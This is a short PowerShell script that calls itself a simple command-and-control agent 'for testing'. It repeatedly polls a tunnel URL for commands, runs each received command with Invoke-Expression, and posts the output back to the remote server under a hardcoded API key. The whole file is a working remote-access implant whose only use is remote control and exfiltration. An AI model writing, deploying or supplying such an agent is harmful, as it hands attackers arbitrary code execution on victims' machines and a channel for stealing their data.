# Simple BITS C2 Agent - HTTP Version (for testing)
# Uses simple API key auth

 $ServerUrl = "https://CHANGE-MECHANGE-ME.trycloudflare.com/bits"
$AgentId = $env:COMPUTERNAME + "_" + $env:USERNAME
$ApiKey = "c2-agent-k3y-2024-s3cr3t"

$Headers = @{
    "X-API-Key" = $ApiKey
}

Write-Host "[*] Simple Agent Starting: $AgentId"
Write-Host "[*] Server: $ServerUrl"

# Main loop
while ($true) {
    try {
        Write-Host "[*] Polling for commands..."
        $response = Invoke-RestMethod -Uri "$ServerUrl/cmd/$AgentId" -Method Get -Headers $Headers -UseBasicParsing
        $command = $response.command
        
        if ($command -and $command -ne "") {
            Write-Host "[>] Command: $command"
            
            try {
                $result = iex $command 2>&1 | Out-String
            }
            catch {
                $result = "Error: $($_.Exception.Message)"
            }
            
            # Send result
            $body = @{ result = $result } | ConvertTo-Json
            Invoke-RestMethod -Uri "$ServerUrl/result/$AgentId" -Method Post -Body $body -ContentType "application/json" -Headers $Headers -UseBasicParsing | Out-Null
            Write-Host "[<] Result sent"
        }
    }
    catch {
        Write-Host "[-] Error: $($_.Exception.Message)"
    }
    
    Start-Sleep -Seconds 3
}
